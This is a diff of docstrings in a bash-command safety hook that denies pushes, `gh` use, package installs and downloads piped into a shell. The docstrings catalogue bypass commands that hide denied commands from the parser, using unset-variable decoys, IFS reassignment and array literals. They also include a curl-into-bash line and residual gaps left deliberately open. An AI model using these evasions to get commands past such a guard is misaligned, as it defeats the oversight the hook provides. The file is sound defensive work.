+    A regex with independently-optional opening/closing braces
+    (`\\{?`/`\\}?`) would additionally accept a MISMATCHED brace
     (`$NAME}`, a stray trailing `}` fused onto an otherwise-bare
     reference; `${NAME`, an unterminated opening brace) as if it were a
-    clean single reference, contradicting its own docstring's "nothing
-    else fused into the same token" claim. `_ONE_REF_SRC`'s two
-    alternatives each pair their own opening and closing brace, so a
-    mismatched brace now falls through to neither alternative and is
-    correctly left unstripped, as fused-on literal text that does not
-    vanish to nothing.
+    clean single reference. `_ONE_REF_SRC`'s two alternatives each pair
+    their own opening and closing brace, so a mismatched brace falls
+    through to neither alternative and is correctly left unstripped, as
+    fused-on literal text that does not vanish to nothing.
 
-    Disclosed residual (found live by Step 8 independent review,
-    twenty-first round, issue #1326), NOT fixed here: a braced subscript
+    Disclosed residual, NOT fixed here: a braced subscript
     reference to a NAME that genuinely IS assigned (as a real array,
     elsewhere in the command) correctly does NOT collapse here -- NAME is
     in NAME_TO_VALUE, so this function correctly returns `False` -- but
     that correctness is hollow if the array's OWN element at that
     specific index is itself an empty string: `NEVERSET=("" b c);
     A=(${NEVERSET[0]} gh pr merge 1); "${A[@]}"` still genuinely reveals
-    `gh` at that position (confirmed live via `declare -p`), yet neither
+    `gh` at that position (per `declare -p`), yet neither
     this collapse nor `_substitute_var_refs_candidates` (which does not
     understand `[...]` subscript syntax at all, and returns the token's
     own raw, unresolved text as its sole "candidate" instead of failing
@@ -1366,31 +1191,30 @@ def _token_is_all_unassigned_refs(token: str, name_to_raw_value: dict[str, str])
     array contents) -- a materially larger change than a token-shape
     regex extension, left as a disclosed gap rather than attempted here.
 
-    Considered, and REJECTED, during Step 8 independent review, twenty-
-    second round (issue #1326): the main hook's own sibling function
-    gained an extra check that treats an unbraced bare name as
+    Considered, and REJECTED: the main hook's own sibling function
+    carries an extra check that treats an unbraced bare name as
     POSSIBLY-not-vanishing whenever some SHORTER prefix of it is a real
     assigned name (`_unbraced_ref_options`), to close a gap in its own
     `_gh_api_method_dynamic_value`/`_gh_api_method_flagname_dynamic_hit`
     value-position reads (neither of which exists in this module -- this
     file's `gh` handling is an unconditional absolute deny via
     `_rule_gh_any`, with no write/read distinction to resolve a value
-    for at all). Porting that same check here regressed a round-18
-    fixture LIVE: `A=($A_UNSET$B_UNSET gh pr merge 1); "${A[@]}"` -- the
+    for at all). Porting that same check here breaks a real scenario:
+    `A=($A_UNSET$B_UNSET gh pr merge 1); "${A[@]}"` -- the
     outer `A=(` assignment itself populates NAME_TO_VALUE with `{"A":
     ""}` (an `_assigned_literals` parsing artifact of `A=` immediately
     followed by the array's own opening paren as a separate punctuation
     token, not a real scalar value for `A`), which is a prefix of the
     UNRELATED inner name `A_UNSET` purely by coincidence of spelling --
-    triggering the new check and wrongly reporting the whole
+    triggering the check and wrongly reporting the whole
     `$A_UNSET$B_UNSET` token as possibly-not-vanishing. That silently
-    disabled `_strip_leading_unassigned_bare_refs`'s own stripping for
+    disables `_strip_leading_unassigned_bare_refs`'s own stripping for
     this token, which `_rule_gh_any`'s position-anchored `seg[0]` check
     depends on entirely to see `gh` once the leading decoy is gone --
     unlike the main hook, this file has no `_rule_a_literal`-style
     whole-segment adjacency scan for `gh`+`pr`+`merge` to fall back on
-    (`gh` is absolute-denied here, not phrase-matched), so there was no
-    safety net once the strip stopped firing. Left UNCHANGED here: this
+    (`gh` is absolute-denied here, not phrase-matched), so there is no
+    safety net once the strip stops firing. Left OUT here: this
     function's every actual caller in this file (`_strip_leading_
     unassigned_bare_refs`, `_is_git_push_segment`, `_process_sub_feeds_
     fetch_tool`, `_skip_fetch_exec_wrapper`, `_fetch_tool_head`) uses
@@ -1401,142 +1225,107 @@ def _token_is_all_unassigned_refs(token: str, name_to_raw_value: dict[str, str])
     the fail-closed direction is to STOP at the token and treat it as
     the value. Porting a fix across the two files' otherwise-identical
     helper name without checking that its callers want the SAME
-    fail-closed direction is exactly the mistake this paragraph
-    documents so a future round does not repeat it.
+    fail-closed direction is exactly the mistake this paragraph exists
+    to prevent.
 
-    Found live by Step 8 independent review, twenty-fourth round (issue
-    #1326), ported from the main hook's own identical fix: a BARE-
-    referenced NAME assigned to the EMPTY STRING (`CFG=; git -c $CFG
-    push origin main`) was wrongly treated as NOT vanishing -- this
-    check only ever asked "is NAME a key in NAME_TO_VALUE at all," never
-    "does NAME's own assigned value actually survive word-splitting."
-    Confirmed live via real bash that an unquoted reference to a
-    variable assigned the empty string word-splits away IDENTICALLY to
-    a genuinely-unset one -- a HARD DENY bypass in this file
-    specifically (a real, non-push command wrongly hard-denied as a
-    push once `-c` swallowed the empty-then-vanished value's own
-    SUCCESSOR token instead).
+    A BARE-referenced NAME assigned to the EMPTY STRING (`CFG=; git -c
+    $CFG push origin main`) must be treated as vanishing too: asking
+    only "is NAME a key in NAME_TO_VALUE at all," never "does NAME's
+    own assigned value actually survive word-splitting," gets this
+    wrong -- under real bash, an unquoted reference to a variable
+    assigned the empty string word-splits away IDENTICALLY to a
+    genuinely-unset one, a hard-deny-relevant misread in this file
+    specifically once `-c` swallows the empty-then-vanished value's own
+    SUCCESSOR token instead.
 
-    Originally (twenty-fourth round) scoped to the BARE form only, not
-    ANY braced reference at all -- ported from the main hook's own
-    identical scoping decision: `_ONE_REF_SRC`'s own "braced" group
-    matches a plain `${NAME}` and a subscripted `${NAME[0]}` under the
-    SAME capture, and `_assigned_literals` records EVERY array
-    declaration's own NAME as mapped to the empty string regardless of
-    the array's real element contents. Applying the empty-value logic
-    to EVERY braced reference was tried and REVERTED after it silently
-    changed the behavior of this module's own disclosed, deliberately-
-    left-open `KNOWN_BYPASS_COMMANDS` residual (`array-literal-
-    subscript-of-a-real-array-whose-own-element-is-empty`) -- this
-    module has no per-index array-element tracking to soundly
-    generalize that case.
+    The empty-value logic deliberately does NOT extend to a SUBSCRIPTED
+    braced reference -- matching the main hook's own scoping decision:
+    `_ONE_REF_SRC`'s own "braced" group matches a plain `${NAME}` and a
+    subscripted `${NAME[0]}` under the SAME capture, and
+    `_assigned_literals` records EVERY array declaration's own NAME as
+    mapped to the empty string regardless of the array's real element
+    contents, so applying the empty-value logic to EVERY braced
+    reference silently changes the behavior of this module's own
+    disclosed, deliberately-left-open `KNOWN_BYPASS_COMMANDS` residual
+    (`array-literal-subscript-of-a-real-array-whose-own-element-is-
+    empty`) -- this module has no per-index array-element tracking to
+    soundly generalize that case.
 
-    Found live by Step 8 independent review, twenty-fifth round (issue
-    #1326), ported from the main hook's own identical fix: excluding
-    EVERY braced reference over-corrected -- a plain, UN-subscripted
-    `${NAME}` has no array-content ambiguity at all, so `CFG=; git -v
-    ${CFG} push origin main` was STILL wrongly left undetected purely
-    because of the `{}` spelling -- a hard deny bypass, confirmed live
-    via real bash that this real-expands to `git -v push origin main`
-    identically to the already-fixed bare form. Closed by checking
-    `match.group(0)` for a literal `[` to tell a subscripted reference
-    from a plain braced one; only the genuinely subscripted form stays
-    on the original, narrower check.
+    Excluding EVERY braced reference would over-correct in the other
+    direction: a plain, UN-subscripted `${NAME}` has no array-content
+    ambiguity at all, and `CFG=; git -v ${CFG} push origin main`
+    real-expands under bash to `git -v push origin main` identically to
+    the bare form -- leaving it undetected purely because of the `{}`
+    spelling would be a hard deny bypass. Hence the `match.group(0)`
+    check for a literal `[` to tell a subscripted reference from a
+    plain braced one; only the genuinely subscripted form stays on the
+    original, narrower check.
 
-    ALSO found live the same round: this check's own empty-string test
-    only ever caught a LITERALLY empty value -- a value consisting
-    ENTIRELY of IFS whitespace ALSO word-splits away to nothing at real
-    bash runtime, confirmed live that `CFG=" "; git -v $CFG push origin
-    main` real-expands identically to the empty-string case -- another
-    hard deny bypass, closed by checking whitespace-truthiness instead
-    of raw truthiness, stripping only `_BASH_DEFAULT_IFS`'s own three
-    characters (see that constant's own module-level comment for the
-    twenty-sixth-round refinement of this same fix).
+    A value consisting ENTIRELY of IFS whitespace ALSO word-splits away
+    to nothing at real bash runtime -- `CFG=" "; git -v $CFG push
+    origin main` real-expands identically to the empty-string case --
+    so the test checks whitespace-truthiness instead of raw truthiness,
+    stripping only `_BASH_DEFAULT_IFS`'s own three characters (see that
+    constant's own module-level comment for why the set is exactly
+    bash's, not Python's).
 
-    Found live by Step 8 independent review, twenty-seventh round
-    (issue #1326), ported from the main hook's own identical fix, and
-    INITIALLY (mis)judged safe-direction-only and merely disclosed
-    rather than fixed: this check always assumed bash's own DEFAULT
-    `$IFS` (`_BASH_DEFAULT_IFS`) -- it had no awareness that the
-    COMMAND ITSELF can reassign `$IFS` before a decoy reference is
-    used. Found live by Step 8 independent review, twenty-eighth round
-    (issue #1326), ported from the main hook's own identical fix, that
-    this is actually a live HARD-DENY-BYPASS gap, not merely a safe-
-    direction one: `IFS="<CR>"; CFG="<CR>"; git -v $CFG push origin
-    main` (a literal carriage-return byte, DOUBLE-QUOTED so it survives
-    shlex's own tokenization intact -- an UNQUOTED `\r` is absorbed as
-    ordinary shell whitespace by `tokenize()` itself before this code
-    ever runs) reaches `_is_git_push_segment`'s own flag-skip loop with
-    `$CFG` wrongly judged NOT-vanishing, so the loop `break`s at the
-    literal `-v` flag's own decoy instead of skipping past it, and
-    genuinely MISSES the `push` sitting one position further --
-    confirmed live end-to-end via `classify()` wrongly returning
-    `deny=False` where the identical-ARGV default-IFS control (`CFG="
-    "; ...`) correctly returns `deny=True`.
+    The COMMAND ITSELF can reassign `$IFS` before a decoy reference is
+    used, and ignoring that is a live hard-deny-bypass gap, not merely
+    a safe-direction one: `IFS="<CR>"; CFG="<CR>"; git -v $CFG push
+    origin main` (a literal carriage-return byte, DOUBLE-QUOTED so it
+    survives shlex's own tokenization intact -- an UNQUOTED `\r` is
+    absorbed as ordinary shell whitespace by `tokenize()` itself before
+    this code ever runs) would reach `_is_git_push_segment`'s own
+    flag-skip loop with `$CFG` wrongly judged NOT-vanishing, so the
+    loop `break`s at the literal `-v` flag's own decoy instead of
+    skipping past it, and genuinely MISSES the `push` sitting one
+    position further -- `classify()` wrongly returning `deny=False`
+    where the identical-ARGV default-IFS control (`CFG=" "; ...`)
+    correctly returns `deny=True`.
 
-    Closed here, NARROWLY, ported from the main hook's own identical
-    fix, rather than by fully tracking `$IFS`'s dynamic value:
-    whenever the command itself assigns ANYTHING to `IFS`, this
-    function fails closed by treating EVERY bare/plain-braced
-    reference as POSSIBLY vanishing regardless of its own value --
-    correct for every caller of this function in this module too
-    (`_strip_leading_unassigned_bare_refs`, `_is_git_push_segment`,
-    `_skip_fetch_exec_wrapper`, `_process_sub_feeds_fetch_tool`,
-    `_fetch_tool_head` all use "vanishes" to mean "safe to skip past,
-    or safe to try the collapsed reading too").
-
-    Found live by Step 8 independent review, twenty-ninth round (issue
-    #1326), ported from the main hook's own identical fix: the twenty-
-    eighth round's own blanket rule above -- and its claim that it was
-    "correct for every caller ... " -- was ITSELF wrong, confirmed live
-    via two independent adversarial reviews finding real regressions.
-    Most consequential: `_is_git_push_segment`'s own `-c`/
+    A blanket rule -- whenever the command itself assigns ANYTHING to
+    `IFS`, treat EVERY bare/plain-braced reference as POSSIBLY
+    vanishing regardless of its own value -- is NOT the right fix,
+    because it is wrong for real callers in both directions. Most
+    consequential: `_is_git_push_segment`'s own `-c`/
     `_GIT_LONG_VALUE_FLAGS` value-consumption block uses "vanishing" to
     decide whether to SKIP PAST a token while hunting for the real
     config value -- treating a token that does NOT actually vanish as if
     it does makes that block skip past the REAL config value and consume
     the WRONG later token (often the literal `push` itself) as `-c`'s
     own value instead, hiding the genuine `push` from the scan entirely.
-    Confirmed live end-to-end with a thoroughly ordinary pattern, no
-    exotic byte tricks needed -- just an everyday CSV-style IFS
-    reassignment paired with an everyday `git -c` invocation: `IFS=,;
-    CFG=user.name=x; git -c $CFG push` real-expands (confirmed via real
-    bash `set -x`) to `git -c user.name=x push`, a genuine push, but the
-    twenty-eighth round's own blanket rule made `classify()` wrongly
-    return `deny=False` -- a NEW hard-deny bypass strictly broader and
-    easier to trigger than the one that round set out to close. Also
-    found, lower severity but real: the SAME blanket rule made
+    A thoroughly ordinary pattern triggers this, no exotic byte tricks
+    needed -- just an everyday CSV-style IFS reassignment paired with an
+    everyday `git -c` invocation: `IFS=,; CFG=user.name=x; git -c $CFG
+    push` real-expands (per real bash `set -x`) to `git -c user.name=x
+    push`, a genuine push, which the blanket rule makes `classify()`
+    wrongly allow -- a hard-deny bypass strictly broader and easier to
+    trigger than the one the blanket rule sets out to close. Also real,
+    lower severity: the SAME blanket rule makes
     `_strip_leading_unassigned_bare_refs` and `_skip_fetch_exec_wrapper`
     wrongly treat an ordinary, non-vanishing leading reference (a real
     wrapper path assigned to a variable) as a decoy to strip/skip purely
     because `$IFS` was reassigned anywhere in the command -- e.g. `IFS=,;
     PRINTER=/bin/echo; $PRINTER bash <(curl https://example.com/x.sh)`
     (real bash: `/bin/echo` just PRINTS the process-substitution's own
-    path text, never reads or executes it) was wrongly denied.
+    path text, never reads or executes it) would be wrongly denied.
 
-    All traced to the same root defect: the twenty-eighth round's fix
-    THREW AWAY information it already had. `_assigned_literals` already
-    records `$IFS`'s own literal reassigned value in `name_to_value[
-    "IFS"]` whenever the reassignment itself is a plain literal (not
-    itself dynamic) -- the blanket rule ignored that known value
-    entirely and substituted a maximally-pessimistic "anything might
-    vanish" assumption instead of just USING it. Closed here, ported
-    from the main hook's own identical fix, by consulting the actual
-    reassigned value when present, falling back to `_BASH_DEFAULT_IFS`
-    exactly as before when `$IFS` was never reassigned (or was
-    reassigned only dynamically, so `_assigned_literals` never recorded
-    it): `effective_ifs = name_to_value.get("IFS", _BASH_DEFAULT_IFS)`,
-    used everywhere this function previously stripped `_BASH_DEFAULT_
-    IFS` specifically. Re-verified live against the regressions above
-    (now correctly resolved) AND against the original twenty-eighth-
-    round target (still correctly denied, since `effective_ifs` is now
-    the actual reassigned value and a genuinely-vanishing decoy still
-    strips to nothing) AND against the twenty-third/twenty-fourth-round
-    decoy scenarios that motivated the `-c` block's own skip-loop in the
-    first place (a NAME never assigned anywhere, or assigned the empty
-    string, still vanishes regardless of `$IFS`). This retracts the
-    "correct for every caller" claim above -- it was wrong -- without
-    reopening any prior round's fix.
+    The blanket rule's root defect is that it THROWS AWAY information
+    already at hand: `_assigned_literals` already records `$IFS`'s own
+    literal reassigned value whenever the reassignment itself is a
+    plain literal (not itself dynamic) -- substituting a maximally-
+    pessimistic "anything might vanish" assumption ignores that known
+    value instead of just USING it. So this function consults the
+    actual reassigned value when present, falling back to
+    `_BASH_DEFAULT_IFS` when `$IFS` was never reassigned (or was
+    reassigned only dynamically, so nothing was recorded):
+    `effective_ifs = name_to_raw_value.get("IFS", _BASH_DEFAULT_IFS)`,
+    used everywhere this function strips IFS characters. The ordinary
+    scenarios above then resolve correctly, the reassigned-IFS decoy is
+    still correctly denied (`effective_ifs` is the actual reassigned
+    value, so a genuinely-vanishing decoy still strips to nothing), and
+    a NAME never assigned anywhere, or assigned the empty string, still
+    vanishes regardless of `$IFS`.
 
     Still disclosed, not fixed, as a narrower residual than the blanket
     rule it replaces: this reads `name_to_raw_value["IFS"]` from the
@@ -1546,58 +1335,43 @@ def _token_is_all_unassigned_refs(token: str, name_to_raw_value: dict[str, str])
     that would apply to it in real execution order, still only ever sees
     ONE captured value regardless of position, the same pre-existing
     scoping limitation every other name-to-value lookup in this module
-    already accepts, not a new gap this fix introduces.
+    already accepts, not a new gap introduced here.
 
-    A second, related disclosed residual found live the same
-    (twenty-eighth) round, also ported from the main hook: the `-c`/
-    `_GIT_LONG_VALUE_FLAGS` value-consumption block inside
-    `_is_git_push_segment` below now correctly determines a value like
+    A second, related disclosed residual, also matching the main hook:
+    the `-c`/`_GIT_LONG_VALUE_FLAGS` value-consumption block inside
+    `_is_git_push_segment` below correctly determines a value like
     `\r` does NOT vanish and consumes it as the flag's own value -- but
     never validates whether the consumed text is a WELL-FORMED git
     config value; real git rejects a malformed one before ever reaching
-    a subcommand, so this can now report (and HARD DENY) a push that
-    real git would never actually perform. A NEW instance of the SAME
-    accepted trade-off the `-c` block's own twenty-third-round fix
-    already makes deliberately: fail closed (a spurious deny) over fail
-    open (a missed real push). Re-examined by Step 8 independent
-    review, twenty-eighth round (issue #1326), ported from the main
-    hook's own identical re-examination, specifically hunting for an
-    UNDER-detection direction here -- none found: real git always
-    consumes exactly one following token as `-c`'s value regardless of
-    well-formedness, so this can only ever find a `push` real git's own
-    argv construction also reaches -- confirmed still
-    safe-direction-only, left as a disclosed residual rather than
-    fixed.
+    a subcommand, so this can report (and HARD DENY) a push that real
+    git would never actually perform. An instance of the SAME accepted
+    trade-off the `-c` block already makes deliberately: fail closed (a
+    spurious deny) over fail open (a missed real push). There is no
+    UNDER-detection direction here: real git always consumes exactly
+    one following token as `-c`'s value regardless of well-formedness,
+    so this can only ever find a `push` real git's own argv
+    construction also reaches -- safe-direction-only, left as a
+    disclosed residual rather than fixed.
 
-    Found live by Step 8 independent review, thirtieth round (issue
-    #1326), ported from the main hook's own identical fix: the twenty-
-    ninth round's own `effective_ifs` fix computed it (and every per-
-    name value it stripped against `effective_ifs`) from NAME_TO_VALUE
-    -- the LOWERCASED map `_assigned_literals` builds for case-
-    INSENSITIVE comparisons elsewhere in this module. Real bash's own
-    `$IFS` word-splitting is case-SENSITIVE: reusing the lowercased map
-    here silently case-folded BOTH sides of the vanishing check, so a
-    token whose real (mixed-case) value does NOT actually overlap the
+    Every lookup this function makes (both `effective_ifs` itself and
+    each per-name value strip-checked against it) uses
+    `_assigned_raw_values`'s own case-PRESERVING map, never
+    NAME_TO_VALUE -- the LOWERCASED map `_assigned_literals` builds for
+    case-INSENSITIVE comparisons elsewhere in this module. Real bash's
+    own `$IFS` word-splitting is case-SENSITIVE: reusing the lowercased
+    map here silently case-folds BOTH sides of the vanishing check, so
+    a token whose real (mixed-case) value does NOT actually overlap the
     real (differently-cased) `$IFS` could still read as "vanishes" once
     both were folded to the same case -- a live hard-deny bypass in
     this module's own `_is_git_push_segment`/`_skip_fetch_exec_wrapper`/
     `_process_sub_feeds_fetch_tool` (any of this function's callers that
     use "vanishes" to mean "skip past me while hunting for the real
     value/position" can have the real value or head token wrongly
-    skipped this way, not only the gh-api write-method case the main
-    hook's own sibling finding was confirmed against there).
-
-    Closed by using `_assigned_raw_values`'s own case-PRESERVING map for
-    every lookup this function makes (both `effective_ifs` itself and
-    each per-name value strip-checked against it) instead of the
-    lowercased one -- this module already carries a case-preserving map
-    for exactly this class of problem (built for `${!NAME}` indirect-
-    reference resolution), already threaded to every caller of this
-    function by the time this round started, so wiring it one level
-    deeper here needed no new plumbing. Re-verified live that every
-    prior round's own pinned scenario still resolves identically under
-    the case-preserving map, since none of them depend on case-folding
-    at all."""
+    skipped this way). This module already carries the case-preserving
+    map for exactly this class of problem (built for `${!NAME}`
+    indirect-reference resolution) and it is already threaded to every
+    caller of this function, so wiring it one level deeper here needed
+    no new plumbing."""
     if not _REF_RUN_TOKEN_RE.match(token):
         return False
     effective_ifs = name_to_raw_value.get("IFS", _BASH_DEFAULT_IFS)
@@ -1627,11 +1401,11 @@ def _strip_leading_unassigned_bare_refs(tokens: list[str], name_to_raw_value: di
     reference the raw token stream shows in that position.
 
     Takes NAME_TO_RAW_VALUE (case-preserving), not the lowercased
-    NAME_TO_VALUE -- ported from `_token_is_all_unassigned_refs`'s own
-    thirtieth-round fix (see its own docstring): this function's caller
-    already has the case-preserving map in scope, and passing the
-    lowercased one here would silently reintroduce that same round's own
-    case-fold bug at this call site too."""
+    NAME_TO_VALUE -- matching `_token_is_all_unassigned_refs`'s own
+    case-preserving lookups (see its own docstring): this function's
+    caller already has the case-preserving map in scope, and passing the
+    lowercased one here would silently reintroduce the same case-fold
+    bug at this call site too."""
     i = 0
     n = len(tokens)
     while i < n and _token_is_all_unassigned_refs(tokens[i], name_to_raw_value):
@@ -1645,20 +1419,20 @@ def _strip_array_literal_newlines(tokens: list[str]) -> list[str]:
     extracts it) EXCEPT one genuinely inside a nested `$(...)` command-
     substitution span within that content. Ported from hooks/gitapex_
     check_bash_safety.py's own function of the same name -- see that
-    module's own docstring (issue #1350) for the full live-verified
-    reasoning: an earlier version tracked generic `(`/`)` nesting depth
-    by bare token equality instead, which a QUOTED literal parenthesis
-    CHARACTER used as ordinary array-element data is indistinguishable
-    from once shlex has dequoted it -- confirmed live via `declare -p`
-    that real bash parses `A=(x '(' pip` + a real newline + `install
-    foo); "${A[@]}"` as a plain five-element array, the quoted `(` never
-    nesting anything, while the depth-counting version misread it as an
-    unclosed subshell and left the following newline wrongly un-
-    stripped, splitting `pip`+`install` into two segments and reopening
-    this same issue's own bug class. Recognizing only the unambiguous
-    `$(` shape via `_command_substitution_token_span` (never a bare,
-    unqualified `(`) matches how real bash's own parser is never
-    confused by a quoted character in the first place."""
+    module's own docstring for the full reasoning: tracking generic
+    `(`/`)` nesting depth by bare token equality does not work, because
+    a QUOTED literal parenthesis CHARACTER used as ordinary
+    array-element data is indistinguishable from a real one once shlex
+    has dequoted it -- real bash parses `A=(x '(' pip` + a real newline
+    + `install foo); "${A[@]}"` as a plain five-element array (per
+    `declare -p`, the quoted `(` never nesting anything), while a
+    depth-counting version misreads it as an unclosed subshell and
+    leaves the following newline wrongly un-stripped, splitting
+    `pip`+`install` into two segments and reopening the newline-
+    collapse bug class. Recognizing only the unambiguous `$(` shape via
+    `_command_substitution_token_span` (never a bare, unqualified `(`)
+    matches how real bash's own parser is never confused by a quoted
+    character in the first place."""
     out: list[str] = []
     i = 0
     n = len(tokens)
@@ -1691,7 +1465,7 @@ def _rule_array_literal_content(
     (see that function's own docstring) -- this function is the guarantor
     of array-literal content-safety, run BEFORE any folding, WITHIN the
     scope described below (a disclosed residual remains -- see the
-    nineteenth-round paragraph). Returns a bare `str | None`, not a
+    outer-scope discussion below). Returns a bare `str | None`, not a
     tuple -- this module's own `Verdict` has no `is_git_push` field the
     way the main hook's does, so there is nothing extra to propagate
     (unlike `_rule_command_substitution_content`'s own tuple return in
@@ -1718,23 +1492,19 @@ def _rule_array_literal_content(
     module's own candidate-resolution primitives already take for an
     unresolvable candidate set.
 
-    Found live by Step 8 independent review, eighteenth round (issue
-    #1326), ported from the main hook's own eighteenth-round fix of the
-    same finding: `A=($NEVERSET uv install); "${A[@]}" foo` and
-    `A=($NEVERSET gh pr merge 1); "${A[@]}"` were both wrongly ALLOWED
-    under every prior round's own fold-condition heuristic (fold
-    unconditionally; fold if any element dynamic; fold if only the first
-    element is dynamic) -- each treated `$NEVERSET` as an ordinary
-    dynamic first element, folding the WHOLE span into one `NAME=`-
-    prefixed token that `_strip_leading_assignments` then discarded
-    entirely as inert, hiding the fully literal `uv`/`install`/`gh`/
-    `pr`/`merge` tokens sitting right after the decoy reference from
-    `_rule_gh_any`'s own `seg[0]` check in particular (that rule, unlike
-    `_rule_a_literal`'s own filtered-adjacency scan, is POSITION-
+    `A=($NEVERSET uv install); "${A[@]}" foo` and `A=($NEVERSET gh pr
+    merge 1); "${A[@]}"` are wrongly ALLOWED under any fold-condition
+    heuristic (fold unconditionally; fold if any element dynamic; fold
+    if only the first element is dynamic) -- each treats `$NEVERSET` as
+    an ordinary dynamic first element, folding the WHOLE span into one
+    `NAME=`-prefixed token that `_strip_leading_assignments` then
+    discards entirely as inert, hiding the fully literal `uv`/`install`/
+    `gh`/`pr`/`merge` tokens sitting right after the decoy reference
+    from `_rule_gh_any`'s own `seg[0]` check in particular (that rule,
+    unlike `_rule_a_literal`'s own filtered-adjacency scan, is POSITION-
     anchored and cannot "see through" a leading dynamic decoy the way a
-    whole-segment scan incidentally can). Confirmed live via a real bash
-    proxy (stand-in `uv`/`gh` binaries on PATH, capturing their own argv)
-    that both genuinely invoke the denied tool once `"${A[@]}"` expands.
+    whole-segment scan incidentally can). Both genuinely invoke the
+    denied tool once `"${A[@]}"` expands at real bash runtime.
     No purely fold-side condition can close this in general -- the fold
     has no way to know, from token shape alone, whether a dynamic-
     looking first element will actually SURVIVE to occupy that position
@@ -1760,9 +1530,9 @@ def _rule_array_literal_content(
     a CATEGORY ERROR when recursing into array-CONSTRUCTION content
     specifically -- `arr=($(seq 1 5))` is capturing `seq`'s OUTPUT as
     plain DATA, not invoking anything; treating its sole `$(...)` element
-    as if it were "the command word being invoked" reproduced the exact
-    false positive this module's own fifteenth round already fixed once,
-    now inside this new recursive check instead of the top-level path.
+    as if it were "the command word being invoked" would reproduce,
+    inside this recursive check, the exact `files=($(ls *.txt))` false
+    positive already handled on the top-level path.
     Skipping is safe here specifically because whatever a `$(...)`
     element's OWN content might embed is ALREADY independently covered by
     `_rule_command_substitution_content` (run separately, over the raw
@@ -1783,57 +1553,48 @@ def _rule_array_literal_content(
     hook's own port of this function needs no equivalent exemption: it
     has no `_rule_bare_install`/`_rule_fetch_exec`-shaped rule at all
     (B1a/B1b/B2 only fail closed on genuine combinatorial candidate-set
-    overflow, never merely on `$(...)`'s own presence), confirmed live
-    that its own round-fifteen motivating cases stay correctly allowed
-    with no "any literal token present" gate needed there.
+    overflow, never merely on `$(...)`'s own presence).
 
-    Found live by Step 8 independent review, nineteenth round (issue
-    #1326): two independent bugs in the eighteenth round's own version of
-    this function, both live-verified and both closed here. First, the
-    recursive `_classify_tokens` call dropped the OUTER scope entirely,
+    Two subtleties in this function's own construction. First, the
+    recursive `_classify_tokens` call must NOT drop the OUTER scope by
     re-deriving `name_to_value`/`name_to_raw_value` from the array's own
-    inner tokens alone -- `T=pip; V=install; A=($T $V); "${A[@]}"` was
-    wrongly ALLOWED, even though `$T`/`$V` resolve to a denied `pip
-    install` at real bash runtime (confirmed live via `declare -p`) the
-    SAME way they would if `$T $V` appeared directly at the top level of
-    the command instead of inside an array literal. Closed by threading
-    the outer scope through, mirroring the main hook's own nineteenth-
-    round fix. Second, the "has literal content" guard above compared every
-    folded inner token against `_is_dynamic` (any `$`-containing token),
-    not the narrower `_is_unresolvable_substitution` (specifically
-    `$(...)`/backtick) that actually motivates it -- `ARR=(${NEVERSET:-gh}
-    ${NEVERSET2:-pr} ${NEVERSET3:-merge}); "${ARR[@]}"` was wrongly
-    ALLOWED, since every element being `$`-prefixed skipped the recursive
-    check entirely even though NONE of them is `$(...)`-shaped and all
-    three resolve staticly (zero assignments needed) via `_substitute_
-    var_refs_candidates`'s own default-clause handling to a real, denied
-    `gh pr merge` (confirmed live via `declare -p`). Closed by narrowing
-    the guard to `_is_unresolvable_substitution`, the exact condition
+    inner tokens alone -- `T=pip; V=install; A=($T $V); "${A[@]}"` would
+    then be wrongly ALLOWED, even though `$T`/`$V` resolve to a denied
+    `pip install` at real bash runtime (per `declare -p`) the SAME way
+    they would if `$T $V` appeared directly at the top level of the
+    command instead of inside an array literal; the outer scope is
+    threaded through, mirroring the main hook. Second, the "has literal
+    content" guard above compares every folded inner token against
+    `_is_unresolvable_substitution` (specifically `$(...)`/backtick),
+    NOT the broader `_is_dynamic` (any `$`-containing token) --
+    `ARR=(${NEVERSET:-gh} ${NEVERSET2:-pr} ${NEVERSET3:-merge});
+    "${ARR[@]}"` must still recurse, since under the broader guard every
+    element being `$`-prefixed would skip the recursive check entirely
+    even though NONE of them is `$(...)`-shaped and all three resolve
+    statically (zero assignments needed) via `_substitute_var_refs_
+    candidates`'s own default-clause handling to a real, denied `gh pr
+    merge` (per `declare -p`). The guard's condition is the exact one
     `_rule_bare_install`/`_rule_fetch_exec` themselves fail closed on --
     not a broader or narrower proxy for their own condition, the same
-    one. Disclosed residual, NOT closed by either fix above:
-    `_rule_command_substitution_content`'s own, pre-existing (since the
-    fourteenth round) recursive checks have the identical outer-scope
-    gap and are not fixed by this round -- a tool/verb built from a
-    variable assigned outside a `$(...)` span's own text is still
-    invisible to that recursive check.
+    one. Disclosed residual, NOT closed by either point above:
+    `_rule_command_substitution_content`'s own recursive checks have the
+    identical outer-scope gap -- a tool/verb built from a variable
+    assigned outside a `$(...)` span's own text is still invisible to
+    that recursive check.
 
-    Found live during independent adversarial review of issue #1350's own
-    newline fix, ported from the sibling module's own fix of the same
-    finding: `NAME=(...)` parens denote a bash WORD LIST, not a command
-    list, so a literal newline between two array elements is ordinary IFS
+    `NAME=(...)` parens denote a bash WORD LIST, not a command list, so
+    a literal newline between two array elements is ordinary IFS
     whitespace separating ELEMENTS, never a statement separator -- left
     as a raw token, the recursive `_classify_tokens` call below would
-    split a fully literal array into fake "segments" the same way this
-    issue's own original bug did at the top level. Confirmed live
-    directly against THIS module: `A=(pip` + a real newline + `install
-    foo); "${A[@]}"` genuinely expands to a denied `pip install foo`
-    invocation at real bash runtime, yet was wrongly ALLOWED here without
-    this strip. Closed by `_strip_array_literal_newlines` (see the
-    sibling module's own function of the same name for the full
-    depth-aware reasoning -- a newline genuinely nested inside a
-    `$(...)`/`(...)` construct WITHIN the array's own content is left
-    untouched)."""
+    split a fully literal array into fake "segments" the same way an
+    unhandled top-level newline collapses statements. `A=(pip` + a real
+    newline + `install foo); "${A[@]}"` genuinely expands to a denied
+    `pip install foo` invocation at real bash runtime, yet would be
+    wrongly ALLOWED without this strip. Handled by
+    `_strip_array_literal_newlines` (see the sibling module's own
+    function of the same name for the full depth-aware reasoning -- a
+    newline genuinely nested inside a `$(...)`/`(...)` construct WITHIN
+    the array's own content is left untouched)."""
     i = 0
     n = len(tokens)
     while i < n:
@@ -1902,10 +1663,9 @@ _WATCHED_VERBS = {"install", "i", "ci", "add"}
 _BARE_INSTALL_TOOLS = {"pnpm", "yarn"}
 _FETCH_EXEC_INTERPRETERS = {"sh", "bash", "zsh", "dash"}
 # Leading wrapper words that precede the actual interpreter without being
-# it themselves. `sudo` was the original, single-member set; `env`,
-# `command`, and `exec` were added by Step 8 independent review,
-# fourteenth round (issue #1326) -- see `_skip_fetch_exec_wrapper`'s own
